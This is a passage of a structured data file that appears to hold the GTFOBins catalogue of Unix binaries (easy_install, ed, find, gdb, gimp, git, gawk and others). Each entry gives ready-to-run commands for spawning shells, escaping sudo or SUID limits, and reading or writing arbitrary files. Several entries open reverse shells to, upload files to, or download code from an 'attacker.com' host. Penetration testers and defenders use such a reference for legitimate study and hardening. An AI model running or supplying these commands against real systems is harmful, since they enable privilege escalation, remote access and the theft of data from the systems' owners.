                "file-download": [
                    {
                        description: "Fetch a remote file via HTTP GET request. The file path must be absolute.",
                        code: "export URL=http://attacker.com/file_to_get\nexport LFILE=/tmp/file_to_save\nTF=$(mktemp -d)\necho \"import os;\nos.execl('$(whereis python)', '$(whereis python)', '-c', \\\"\\\"\\\"import sys;\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve('$URL', '$LFILE')\\\"\\\"\\\")\" > $TF/setup.py\npip install $TF\n",
                    },
                ],
                "file-write": [
                    {
                        description: "The file path must be absolute.",
                        code: "export LFILE=/tmp/file_to_save\nTF=$(mktemp -d)\necho \"import os;\nos.execl('$(whereis python)', 'python', '-c', 'open(\\\"$LFILE\\\",\\\"w+\\\").write(\\\"DATA\\\")')\" > $TF/setup.py\neasy_install $TF\n",
                    },
                ],
                "file-read": [
                    {
                        description: "The read file content is wrapped within program messages.",
                        code: "TF=$(mktemp -d)\necho 'print(open(\"file_to_read\").read())' > $TF/setup.py\neasy_install $TF\n",
                    },
                ],
                "library-load": [
                    {
                        code: "TF=$(mktemp -d)\necho 'from ctypes import cdll; cdll.LoadLibrary(\"lib.so\")' > $TF/setup.py\neasy_install $TF\n",
                    },
                ],
                sudo: [
                    {
                        code: "TF=$(mktemp -d)\necho \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py\nsudo easy_install $TF\n",
                    },
                ],
            },
        },
        eb: {
            description:
                "This invokes the default logging service, which is likely to be [`journalctl`](/gtfobins/journalctl/), other functions may apply. For this to work the target must be connected to AWS instance via EB-CLI.",
            functions: {
                shell: [
                    {
                        code: "eb logs\n!/bin/sh\n",
                    },
                ],
                sudo: [
                    {
                        code: "sudo eb logs\n!/bin/sh\n",
                    },
                ],
            },
        },
        ed: {
            functions: {
                shell: [
                    {
                        code: "ed\n!/bin/sh\n",
                    },
                ],
                "file-write": [
                    {
                        code: "ed file_to_write\na\nDATA\n.\nw\nq\n",
                    },
                ],
                "file-read": [
                    {
                        code: "ed file_to_read\n,p\nq\n",
                    },
                ],
                suid: [
                    {
                        code: "./ed file_to_read\n,p\nq\n",
                    },
                ],
                sudo: [
                    {
                        code: "sudo ed\n!/bin/sh\n",
                    },
                ],
                "limited-suid": [
                    {
                        code: "./ed\n!/bin/sh\n",
                    },
                ],
            },
        },
        efax: {
            description:
                "The content is actually parsed by the command, thus it may not be suitable for reading arbitrary files.",
            functions: {
                suid: [
                    {
                        code: 'LFILE=file_to_read\n./efax -d "$LFILE"\n',
                    },
                ],
                sudo: [
                    {
                        code: 'LFILE=file_to_read\nsudo efax -d "$LFILE"\n',
                    },
                ],
            },
        },
        elvish: {
            functions: {
                "file-read": [
                    {
                        code: "export LFILE=file_to_read\nelvish -c 'echo (slurp <$E:LFILE)'\n",
                    },
                ],
                "file-write": [
                    {
                        code: "export LFILE=file_to_write\nelvish -c 'echo DATA >$E:LFILE'\n",
                    },
                ],
                shell: [
                    {
                        code: "elvish",
                    },
                ],
                suid: [
                    {
                        code: "./elvish",
                    },
                ],
                sudo: [
                    {
                        code: "sudo elvish",
                    },
                ],
            },
        },
        emacs: {
            functions: {
                shell: [
                    {
                        code: "emacs -Q -nw --eval '(term \"/bin/sh\")'",
                    },
                ],
                "file-write": [
                    {
                        code: "emacs file_to_write\nDATA\nC-x C-s\n",
                    },
                ],
                "file-read": [
                    {
                        code: "emacs file_to_read",
                    },
                ],
                suid: [
                    {
                        code: "./emacs -Q -nw --eval '(term \"/bin/sh -p\")'",
                    },
                ],
                sudo: [
                    {
                        code: "sudo emacs -Q -nw --eval '(term \"/bin/sh\")'",
                    },
                ],
            },
        },
        enscript: {
            functions: {
                shell: [
                    {
                        code: "enscript /dev/null -qo /dev/null -I '/bin/sh >&2'",
                    },
                ],
                sudo: [
                    {
                        code: "sudo enscript /dev/null -qo /dev/null -I '/bin/sh >&2'",
                    },
                ],
            },
        },
        env: {
            functions: {
                shell: [
                    {
                        code: "env /bin/sh",
                    },
                ],
                suid: [
                    {
                        code: "./env /bin/sh -p",
                    },
                ],
                sudo: [
                    {
                        code: "sudo env /bin/sh",
                    },
                ],
            },
        },
        eqn: {
            description:
                "The content is actually parsed and corrupted by the command, thus it may not be suitable for arbitrary files.",
            functions: {
                "file-read": [
                    {
                        code: 'LFILE=file_to_read\neqn "$LFILE"\n',
                    },
                ],
                suid: [
                    {
                        code: 'LFILE=file_to_read\n./eqn "$LFILE"\n',
                    },
                ],
                sudo: [
                    {
                        code: 'LFILE=file_to_read\nsudo eqn "$LFILE"\n',
                    },
                ],
            },
        },
        espeak: {
            description:
                "The file content appears in the middle of other textual information, thus it might not be suitable to read arbitray binary files.",
            functions: {
                "file-read": [
                    {
                        code: 'LFILE=file_to_read\nespeak -qXf "$LFILE"\n',
                    },
                ],
                suid: [
                    {
                        code: 'LFILE=file_to_read\n./espeak -qXf "$LFILE"\n',
                    },
                ],
                sudo: [
                    {
                        code: 'LFILE=file_to_read\nsudo espeak -qXf "$LFILE"\n',
                    },
                ],
            },
        },
        ex: {
            functions: {
                shell: [
                    {
                        code: "ex\n!/bin/sh\n",
                    },
                ],
                "file-write": [
                    {
                        code: "ex file_to_write\na\nDATA\n.\nw\nq\n",
                    },
                ],
                "file-read": [
                    {
                        code: "ex file_to_read\n,p\nq\n",
                    },
                ],
                sudo: [
                    {
                        code: "sudo ex\n!/bin/sh\n",
                    },
                ],
            },
        },
        exiftool: {
            description: "If the permissions allow it, files are moved (instead of copied) to the destination.\n",
            functions: {
                "file-read": [
                    {
                        code: "LFILE=file_to_read\nOUTPUT=output_file\nexiftool -filename=$OUTPUT $LFILE\ncat $OUTPUT\n",
                    },
                ],
                "file-write": [
                    {
                        code: "LFILE=file_to_write\nINPUT=input_file\nexiftool -filename=$LFILE $INPUT\n",
                    },
                ],
                sudo: [
                    {
                        code: "LFILE=file_to_write\nINPUT=input_file\nsudo exiftool -filename=$LFILE $INPUT\n",
                    },
                ],
            },
        },
        expand: {
            description: "The read file content is corrupted by replacing tabs with spaces.",
            functions: {
                "file-read": [
                    {
                        code: 'LFILE=file_to_read\nexpand "$LFILE"\n',
                    },
                ],
                suid: [
                    {
                        code: 'LFILE=file_to_read\n./expand "$LFILE"\n',
                    },
                ],
                sudo: [
                    {
                        code: 'LFILE=file_to_read\nsudo expand "$LFILE"\n',
                    },
                ],
            },
        },
        expect: {
            functions: {
                "file-read": [
                    {
                        description:
                            "The file is read and parsed as an `expect` command file, the content of the first invalid line is returned in an error message. Thus, this might not be suitable to read arbitrary binary files.",
                        code: "LFILE=file_to_read\nexpect $LFILE\n",
                    },
                ],
                shell: [
                    {
                        code: "expect -c 'spawn /bin/sh;interact'",
                    },
                ],
                suid: [
                    {
                        code: "./expect -c 'spawn /bin/sh -p;interact'",
                    },
                ],
                sudo: [
                    {
                        code: "sudo expect -c 'spawn /bin/sh;interact'",
                    },
                ],
            },
        },
        facter: {
            functions: {
                shell: [
                    {
                        code: "TF=$(mktemp -d)\necho 'exec(\"/bin/sh\")' > $TF/x.rb\nFACTERLIB=$TF facter\n",
                    },
                ],
                sudo: [
                    {
                        code: "TF=$(mktemp -d)\necho 'exec(\"/bin/sh\")' > $TF/x.rb\nsudo FACTERLIB=$TF facter\n",
                    },
                ],
            },
        },
        file: {
            functions: {
                "file-read": [
                    {
                        description:
                            "Each input line is treated as a filename for the `file` command and the output is corrupted by a suffix `:` followed by the result or the error of the operation, so this may not be suitable for binary files.",
                        code: "LFILE=file_to_read\nfile -f $LFILE\n",
                    },
                    {
                        description:
                            "Each line is corrupted by a prefix string and wrapped inside quotes, so this may not be suitable for binary files.\n\nIf a line in the target file begins with a `#`, it will not be printed as these lines are parsed as comments.\n\nIt can also be provided with a directory and will read each file in the directory.\n",
                        code: "LFILE=file_to_read\nfile -m $LFILE\n",
                    },
                ],
                suid: [
                    {
                        description:
                            "Each input line is treated as a filename for the `file` command and the output is corrupted by a suffix `:` followed by the result or the error of the operation, so this may not be suitable for binary files.",
                        code: "LFILE=file_to_read\n./file -f $LFILE\n",
                    },
                ],
                sudo: [
                    {
                        description:
                            "Each input line is treated as a filename for the `file` command and the output is corrupted by a suffix `:` followed by the result or the error of the operation, so this may not be suitable for binary files.",
                        code: "LFILE=file_to_read\nsudo file -f $LFILE\n",
                    },
                ],
            },
        },
        find: {
            functions: {
                shell: [
                    {
                        code: "find . -exec /bin/sh \\; -quit",
                    },
                ],
                suid: [
                    {
                        code: "./find . -exec /bin/sh -p \\; -quit",
                    },
                ],
                sudo: [
                    {
                        code: "sudo find . -exec /bin/sh \\; -quit",
                    },
                ],
                "file-write": [
                    {
                        description: "DATA is a format string, it supports some escape sequences.",
                        code: 'LFILE=file_to_write\nfind / -fprintf "$FILE" DATA -quit\n',
                    },
                ],
            },
        },
        finger: {
            description: "`finger` hangs waiting for the remote peer to close the socket.\n",
            functions: {
                "file-upload": [
                    {
                        description:
                            'Send a binary file to a TCP port. Run `sudo nc -l -p 79 | base64 -d > "file_to_save"` on the attacker box to collect the file. The file length is limited by the maximum size of arguments.',
                        code: 'RHOST=attacker.com\nLFILE=file_to_send\nfinger "$(base64 $LFILE)@$RHOST"\n',
                    },
                ],
                "file-download": [
                    {
                        description:
                            'Fetch remote binary file from a remote TCP port. Run `base64 "file_to_send" | sudo nc -l -p 79` on the attacker box to send the file.',
                        code: 'RHOST=attacker.com\nLFILE=file_to_save\nfinger x@$RHOST | base64 -d > "$LFILE"\n',
                    },
                ],
            },
        },
        fish: {
            functions: {
                shell: [
                    {
                        code: "fish",
                    },
                ],
                suid: [
                    {
                        code: "./fish",
                    },
                ],
                sudo: [
                    {
                        code: "sudo fish",
                    },
                ],
            },
        },
        flock: {
            functions: {
                shell: [
                    {
                        code: "flock -u / /bin/sh",
                    },
                ],
                suid: [
                    {
                        code: "./flock -u / /bin/sh -p",
                    },
                ],
                sudo: [
                    {
                        code: "sudo flock -u / /bin/sh",
                    },
                ],
            },
        },
        fmt: {
            description: "The read file content is not binary-safe.",
            functions: {
                "file-read": [
                    {
                        description: "This only works for the GNU version of `fmt`.",
                        code: 'LFILE=file_to_read\nfmt -pNON_EXISTING_PREFIX "$LFILE"\n',
                    },
                    {
                        description: "This corrupts the output by wrapping very long lines at the given width.",
                        code: 'LFILE=file_to_read\nfmt -999 "$LFILE"\n',
                    },
                ],
                suid: [
                    {
                        description: "This corrupts the output by wrapping very long lines at the given width.",
                        code: 'LFILE=file_to_read\n./fmt -999 "$LFILE"\n',
                    },
                ],
                sudo: [
                    {
                        description: "This corrupts the output by wrapping very long lines at the given width.",
                        code: 'LFILE=file_to_read\nsudo fmt -999 "$LFILE"\n',
                    },
                ],
            },
        },
        fold: {
            functions: {
                "file-read": [
                    {
                        code: 'LFILE=file_to_read\nfold -w99999999 "$LFILE"\n',
                    },
                ],
                suid: [
                    {
                        code: 'LFILE=file_to_read\n./fold -w99999999 "$LFILE"\n',
                    },
                ],
                sudo: [
                    {
                        code: 'LFILE=file_to_read\nsudo fold -w99999999 "$LFILE"\n',
                    },
                ],
            },
        },
        fping: {
            functions: {
                "file-read": [
                    {
                        code: "LFILE=file_to_read\nfping -f $LFILE\n",
                    },
                ],
                sudo: [
                    {
                        code: "LFILE=file_to_read\nsudo fping -f $LFILE\n",
                    },
                ],
            },
        },
        ftp: {
            functions: {
                shell: [
                    {
                        code: "ftp\n!/bin/sh\n",
                    },
                ],
                "file-upload": [
                    {
                        description: "Send local file to a FTP server.",
                        code: "RHOST=attacker.com\nftp $RHOST\nput file_to_send\n",
                    },
                ],
                "file-download": [
                    {
                        description: "Fetch a remote file from a FTP server.",
                        code: "RHOST=attacker.com\nftp $RHOST\nget file_to_get\n",
                    },
                ],
                sudo: [
                    {
                        code: "sudo ftp\n!/bin/sh\n",
                    },
                ],
            },
        },
        gawk: {
            functions: {
                shell: [
                    {
                        code: "gawk 'BEGIN {system(\"/bin/sh\")}'",
                    },
                ],
                "non-interactive-reverse-shell": [
                    {
                        description: "Run `nc -l -p 12345` on the attacker box to receive the shell.",
                        code: 'RHOST=attacker.com\nRPORT=12345\ngawk -v RHOST=$RHOST -v RPORT=$RPORT \'BEGIN {\n    s = "/inet/tcp/0/" RHOST "/" RPORT;\n    while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;\n    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}\'\n',
                    },
                ],
                "non-interactive-bind-shell": [
                    {
                        description: "Run `nc target.com 12345` on the attacker box to connect to the shell.",
                        code: 'LPORT=12345\ngawk -v LPORT=$LPORT \'BEGIN {\n    s = "/inet/tcp/" LPORT "/0/0";\n    while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;\n    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}\'\n',
                    },
                ],
                "file-write": [
                    {
                        code: "LFILE=file_to_write\ngawk -v LFILE=$LFILE 'BEGIN { print \"DATA\" > LFILE }'\n",
                    },
                ],
                "file-read": [
                    {
                        code: "LFILE=file_to_read\ngawk '//' \"$LFILE\"\n",
                    },
                ],
                suid: [
                    {
                        code: "LFILE=file_to_read\n./gawk '//' \"$LFILE\"\n",
                    },
                ],
                sudo: [
                    {
                        code: "sudo gawk 'BEGIN {system(\"/bin/sh\")}'",
                    },
                ],
                "limited-suid": [
                    {
                        code: "./gawk 'BEGIN {system(\"/bin/sh\")}'",
                    },
                ],
            },
        },
        gcc: {
            functions: {
                "file-read": [
                    {
                        code: 'LFILE=file_to_read\ngcc -x c -E "$LFILE"\n',
                    },
                    {
                        description:
                            "The file is read and parsed as a list of files (one per line), the content is disaplyed as error messages, thus this might not be suitable to read arbitrary data.",
                        code: 'LFILE=file_to_read\ngcc @"$LFILE"\n',
                    },
                ],
                "file-write": [
                    {
                        code: "LFILE=file_to_delete\ngcc -xc /dev/null -o $LFILE\n",
                    },
                ],
                shell: [
                    {
                        code: "gcc -wrapper /bin/sh,-s .",
                    },
                ],
                sudo: [
                    {
                        code: "sudo gcc -wrapper /bin/sh,-s .",
                    },
                ],
            },
        },
        gcloud: {
            functions: {
                shell: [
                    {
                        description:
                            "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.",
                        code: "gcloud help\n!/bin/sh\n",
                    },
                ],
                sudo: [
                    {
                        description:
                            "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.",
                        code: "sudo gcloud help\n!/bin/sh\n",
                    },
                ],
            },
        },
        gcore: {
            description:
                "It can be used to generate core dumps of running processes. Such files often contains sensitive information such as open files content, cryptographic keys, passwords, etc. This command produces a binary file named `core.$PID`, that is then often filtered with `strings` to narrow down relevant information.",
            functions: {
                "file-read": [
                    {
                        code: "gcore $PID",
                    },
                ],
                sudo: [
                    {
                        code: "sudo gcore $PID",
                    },
                ],
                suid: [
                    {
                        code: "./gcore $PID",
                    },
                ],
            },
        },
        gdb: {
            functions: {
                shell: [
                    {
                        code: "gdb -nx -ex '!sh' -ex quit",
                    },
                ],
                "reverse-shell": [
                    {
                        description:
                            "This requires that GDB is compiled with Python support. Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.",
                        code: 'export RHOST=attacker.com\nexport RPORT=12345\ngdb -nx -ex \'python import sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn("/bin/sh")\' -ex quit\n',
                    },
                ],
                "file-upload": [
                    {
                        description:
                            'This requires that GDB is compiled with Python support. Send local file via "d" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.',
                        code: 'export URL=http://attacker.com/\nexport LFILE=file_to_send\ngdb -nx -ex \'python import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e["URL"], bytes(u.urlencode({"d":open(e["LFILE"]).read()}).encode()))\' -ex quit\n',
                    },
                    {
                        description:
                            "This requires that GDB is compiled with Python support. Serve files in the local folder running an HTTP server.",
                        code: 'export LPORT=8888\ngdb -nx -ex \'python import sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer(("", int(e["LPORT"])), s.SimpleHTTPRequestHandler).serve_forever()\' -ex quit\n',
                    },
                ],
                "file-download": [
                    {
                        description:
                            "This requires that GDB is compiled with Python support. Fetch a remote file via HTTP GET request.",
                        code: 'export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\ngdb -nx -ex \'python import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(e["URL"], e["LFILE"])\' -ex quit\n',
                    },
                ],
                "file-write": [
                    {
                        description: "This requires that GDB is compiled with Python support.",
                        code: 'LFILE=file_to_write\ngdb -nx -ex "dump value $LFILE \\"DATA\\"" -ex quit\n',
                    },
                ],
                "file-read": [
                    {
                        description: "This requires that GDB is compiled with Python support.",
                        code: "gdb -nx -ex 'python print(open(\"file_to_read\").read())' -ex quit",
                    },
                ],
                "library-load": [
                    {
                        description: "This requires that GDB is compiled with Python support.",
                        code: "gdb -nx -ex 'python from ctypes import cdll; cdll.LoadLibrary(\"lib.so\")' -ex quit",
                    },
                ],
                suid: [
                    {
                        description: "This requires that GDB is compiled with Python support.",
                        code: './gdb -nx -ex \'python import os; os.execl("/bin/sh", "sh", "-p")\' -ex quit',
                    },
                ],
                sudo: [
                    {
                        code: "sudo gdb -nx -ex '!sh' -ex quit",
                    },
                ],
                capabilities: [
                    {
                        description: "This requires that GDB is compiled with Python support.",
                        code: "./gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit",
                    },
                ],
            },
        },
        gem: {
            functions: {
                shell: [
                    {
                        description:
                            "This requires the name of an installed gem to be provided (`rdoc` is usually installed).",
                        code: 'gem open -e "/bin/sh -c /bin/sh" rdoc',
                    },
                    {
                        description:
                            "This invokes the default editor, which is likely to be [`vi`](/gtfobins/vi/), other functions may apply. This requires the name of an installed gem to be provided (`rdoc` is usually installed).",
                        code: "gem open rdoc\n:!/bin/sh\n",
                    },
                    {
                        description: "This executes the specified file as [`ruby`](/gtfobins/ruby/) code.",
                        code: "TF=$(mktemp -d)\necho 'system(\"/bin/sh\")' > $TF/x\ngem build $TF/x\n",
                    },
                    {
                        description: "This executes the specified file as [`ruby`](/gtfobins/ruby/) code.",
                        code: "TF=$(mktemp -d)\necho 'system(\"/bin/sh\")' > $TF/x\ngem install --file $TF/x\n",
                    },
                ],
                sudo: [
                    {
                        description:
                            "This requires the name of an installed gem to be provided (`rdoc` is usually installed).",
                        code: 'sudo gem open -e "/bin/sh -c /bin/sh" rdoc',
                    },
                ],
            },
        },
        genie: {
            functions: {
                shell: [
                    {
                        code: "genie -c '/bin/sh'",
                    },
                ],
                suid: [
                    {
                        code: "./genie -c '/bin/sh'",
                    },
                ],
                sudo: [
                    {
                        code: "sudo genie -c '/bin/sh'",
                    },
                ],
            },
        },
        genisoimage: {
            description:
                "The output is placed inside the ISO9660 file system binary format thus it may not be suitable for binary content as is, yet it can be mounted or extracted with tools like `7z`.",
            functions: {
                "file-read": [
                    {
                        code: 'LFILE=file_to_read\ngenisoimage -q -o - "$LFILE"\n',
                    },
                ],
                suid: [
                    {
                        description:
                            "The file is parsed, and some of its content is disclosed by the error messages, thus this might not be suitable to read arbitrary data.",
                        code: 'LFILE=file_to_read\n./genisoimage -sort "$LFILE"\n',
                    },
                ],
                sudo: [
                    {
                        code: 'LFILE=file_to_read\nsudo genisoimage -q -o - "$LFILE"\n',
                    },
                ],
            },
        },
        ghc: {
            functions: {
                shell: [
                    {
                        code: "ghc -e 'System.Process.callCommand \"/bin/sh\"'",
                    },
                ],
                sudo: [
                    {
                        code: "sudo ghc -e 'System.Process.callCommand \"/bin/sh\"'",
                    },
                ],
            },
        },
        ghci: {
            functions: {
                shell: [
                    {
                        code: 'ghci\nSystem.Process.callCommand "/bin/sh"\n',
                    },
                ],
                sudo: [
                    {
                        code: 'sudo ghci\nSystem.Process.callCommand "/bin/sh"\n',
                    },
                ],
            },
        },
        gimp: {
            description: "The binary hangs after executing the Python code and can be terminated pressing ``ctrl-c``.",
            functions: {
                shell: [
                    {
                        code: "gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system(\"sh\")'",
                    },
                ],
                "reverse-shell": [
                    {
                        description:
                            "Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.",
                        code: 'export RHOST=attacker.com\nexport RPORT=12345\ngimp -idf --batch-interpreter=python-fu-eval -b \'import sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn("/bin/sh")\'\n',
                    },
                ],
                "file-upload": [
                    {
                        description:
                            'Send local file via "d" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.',
                        code: 'export URL=http://attacker.com/\nexport LFILE=file_to_send\ngimp -idf --batch-interpreter=python-fu-eval -b \'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e["URL"], bytes(u.urlencode({"d":open(e["LFILE"]).read()}).encode()))\'\n',
                    },
                    {
                        description: "Serve files in the local folder running an HTTP server.",
                        code: 'export LPORT=8888\ngimp -idf --batch-interpreter=python-fu-eval -b \'import sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer(("", int(e["LPORT"])), s.SimpleHTTPRequestHandler).serve_forever()\'\n',
                    },
                ],
                "file-download": [
                    {
                        description: "Fetch a remote file via HTTP GET request.",
                        code: 'export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\ngimp -idf --batch-interpreter=python-fu-eval -b \'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(e["URL"], e["LFILE"])\'\n',
                    },
                ],
                "file-write": [
                    {
                        code: 'gimp -idf --batch-interpreter=python-fu-eval -b \'open("file_to_write", "wb").write("DATA")\'\n',
                    },
                ],
                "file-read": [
                    {
                        code: "gimp -idf --batch-interpreter=python-fu-eval -b 'print(open(\"file_to_read\").read())'",
                    },
                ],
                "library-load": [
                    {
                        code: "gimp -idf --batch-interpreter=python-fu-eval -b 'from ctypes import cdll; cdll.LoadLibrary(\"lib.so\")'",
                    },
                ],
                suid: [
                    {
                        code: './gimp -idf --batch-interpreter=python-fu-eval -b \'import os; os.execl("/bin/sh", "sh", "-p")\'',
                    },
                ],
                sudo: [
                    {
                        code: "sudo gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system(\"sh\")'",
                    },
                ],
            },
        },
        ginsh: {
            functions: {
                shell: [
                    {
                        code: "ginsh\n!/bin/sh\n",
                    },
                ],
                "limited-suid": [
                    {
                        code: "./ginsh\n!/bin/sh\n",
                    },
                ],
                sudo: [
                    {
                        code: "sudo ginsh\n!/bin/sh\n",
                    },
                ],
            },
        },
        git: {
            functions: {
                shell: [
                    {
                        code: "PAGER='sh -c \"exec sh 0<&1\"' git -p help",
                    },
                    {
                        description:
                            "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.",
                        code: "git help config\n!/bin/sh\n",
                    },
                    {
                        description:
                            "The help system can also be reached from any `git` command, e.g., `git branch`. This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.",
                        code: "git branch --help config\n!/bin/sh\n",
                    },
                    {
                        description:
                            "Git hooks are merely shell scripts and in the following example the hook associated to the `pre-commit` action is used. Any other hook will work, just make sure to be able perform the proper action to trigger it. An existing repository can also be used and moving into the directory works too, i.e., instead of using the `-C` option.",
                        code: 'TF=$(mktemp -d)\ngit init "$TF"\necho \'exec /bin/sh 0<&2 1>&2\' >"$TF/.git/hooks/pre-commit.sample"\nmv "$TF/.git/hooks/pre-commit.sample" "$TF/.git/hooks/pre-commit"\ngit -C "$TF" commit --allow-empty -m x\n',
                    },
                    {
                        code: 'TF=$(mktemp -d)\nln -s /bin/sh "$TF/git-x"\ngit "--exec-path=$TF" x\n',
                    },
                ],
                "file-read": [
                    {
                        description: "The read file content is displayed in `diff` style output format.",
                        code: "LFILE=file_to_read\ngit diff /dev/null $LFILE\n",
                    },
                ],
                "file-write": [
                    {
                        description:
                            "The patch can be created locally by creating the file that will be written on the target using its absolute path, then `git diff /dev/null /path/to/file >x.patch`.",
                        code: "git apply --unsafe-paths --directory / x.patch\n",
                    },
                ],
                sudo: [
                    {
                        code: "sudo PAGER='sh -c \"exec sh 0<&1\"' git -p help",
                    },
                    {
                        description:
                            "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.",
                        code: "sudo git -p help config\n!/bin/sh\n",
                    },
                    {
                        description:
                            "The help system can also be reached from any `git` command, e.g., `git branch`. This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.",
                        code: "sudo git branch --help config\n!/bin/sh\n",
                    },
                    {
                        description:
                            "Git hooks are merely shell scripts and in the following example the hook associated to the `pre-commit` action is used. Any other hook will work, just make sure to be able perform the proper action to trigger it. An existing repository can also be used and moving into the directory works too, i.e., instead of using the `-C` option.",
                        code: 'TF=$(mktemp -d)\ngit init "$TF"\necho \'exec /bin/sh 0<&2 1>&2\' >"$TF/.git/hooks/pre-commit.sample"\nmv "$TF/.git/hooks/pre-commit.sample" "$TF/.git/hooks/pre-commit"\nsudo git -C "$TF" commit --allow-empty -m x\n',
                    },
                    {
                        code: 'TF=$(mktemp -d)\nln -s /bin/sh "$TF/git-x"\nsudo git "--exec-path=$TF" x\n',
                    },
                ],
                "limited-suid": [
                    {
                        code: "PAGER='sh -c \"exec sh 0<&1\"' ./git -p help",
                    },
                ],
            },
        },
        grc: {
            functions: {
                shell: [
                    {
                        code: "grc --pty /bin/sh",
                    },
                ],
                sudo: [
                    {
                        code: "sudo grc --pty /bin/sh",
                    },
                ],
            },
        },
        grep: {
            description:
                "There are many `grep` flavors that in many cases are just copies, symlinks or wrappers around the original binary that may share the same behavior, for example: `egrep`, `fgrep`, `zgrep`, etc.\n",
            functions: {
                "file-read": [
                    {
                        code: "LFILE=file_to_read\ngrep '' $LFILE\n",
                    },
                ],
                suid: [
                    {
                        code: "LFILE=file_to_read\n./grep '' $LFILE\n",
                    },
                ],
                sudo: [
                    {
                        code: "LFILE=file_to_read\nsudo grep '' $LFILE\n",
                    },
                ],
            },
        },
        gtester: {
            functions: {
                "file-write": [
                    {
                        description:
                            'Data to be written appears in an XML attribute in the output file (`<testbinary path="DATA">`).',
                        code: 'LFILE=file_to_write\ngtester "DATA" -o $LFILE\n',
                    },
                ],
                shell: [
                    {
                        code: "TF=$(mktemp)\necho '#!/bin/sh' > $TF\necho 'exec /bin/sh -p 0<&1' >> $TF\nchmod +x $TF\ngtester -q $TF\n",
                    },
                ],
                sudo: [
                    {
                        code: "TF=$(mktemp)\necho '#!/bin/sh' > $TF\necho 'exec /bin/sh 0<&1' >> $TF\nchmod +x $TF\nsudo gtester -q $TF\n",
                    },
                ],
                suid: [
                    {
                        code: "TF=$(mktemp)\necho '#!/bin/sh -p' > $TF\necho 'exec /bin/sh -p 0<&1' >> $TF\nchmod +x $TF\nsudo gtester -q $TF\n",
                    },
                ],
            },
        },
        gzip: {
            description:
                "There are also a number of other utilities that rely on `gzip` under the hood, e.g., `zless`, `zcat`, `gunzip`, etc. Besides having similar features, they also allow privileged reads if `gzip` itself is SUID.",
            functions: {
                "file-read": [
                    {
                        code: "LFILE=file_to_read\ngzip -f $LFILE -t\n",
                    },
                    {
                        code: "LFILE=file_to_read\ngzip -c $LFILE | gzip -d\n",
                    },
                ],
                suid: [
                    {
                        code: "LFILE=file_to_read\n./gzip -f $LFILE -t\n",
                    },
                ],
                sudo: [
                    {
                        code: "LFILE=file_to_read\nsudo gzip -f $LFILE -t\n",
                    },
                ],
            },
        },
        hd: {
            description: "The output is actually an hex dump.",
            functions: {
                "file-read": [
                    {
                        code: 'LFILE=file_to_read\nhd "$LFILE"\n',
                    },
                ],
                suid: [
                    {
                        code: 'LFILE=file_to_read\n./hd "$LFILE"\n',
                    },
                ],
                sudo: [
                    {
                        code: 'LFILE=file_to_read\nsudo hd "$LFILE"\n',
                    },
                ],
            },
        },
        head: {
            functions: {
                "file-read": [
                    {
                        code: 'LFILE=file_to_read\nhead -c1G "$LFILE"\n',
                    },
                ],
                suid: [
                    {
                        code: 'LFILE=file_to_read\n./head -c1G "$LFILE"\n',
                    },
                ],
                sudo: [
                    {
                        code: 'LFILE=file_to_read\nsudo head -c1G "$LFILE"\n',
                    },
                ],
            },
        },
        hexdump: {
            description: "The output is actually an hex dump.",
            functions: {
                "file-read": [
                    {
                        code: 'LFILE=file_to_read\nhexdump -C "$LFILE"\n',
                    },
                ],
                suid: [
                    {
                        code: 'LFILE=file_to_read\n./hexdump -C "$LFILE"\n',
                    },
                ],
                sudo: [
                    {
                        code: 'LFILE=file_to_read\nsudo hexdump -C "$LFILE"\n',
                    },
                ],
            },
        },
        highlight: {
            functions: {
                "file-read": [
                    {
                        code: 'LFILE=file_to_read\nhighlight --no-doc --failsafe "$LFILE"\n',
                    },
                ],
                suid: [
                    {
                        code: 'LFILE=file_to_read\n./highlight --no-doc --failsafe "$LFILE"\n',
                    },
                ],
                sudo: [
                    {
                        code: 'LFILE=file_to_read\nsudo highlight --no-doc --failsafe "$LFILE"\n',
                    },
                ],
            },
        },
        hping3: {
            functions: {
                shell: [
                    {
                        code: "hping3\n/bin/sh\n",
                    },
                ],
                suid: [
                    {
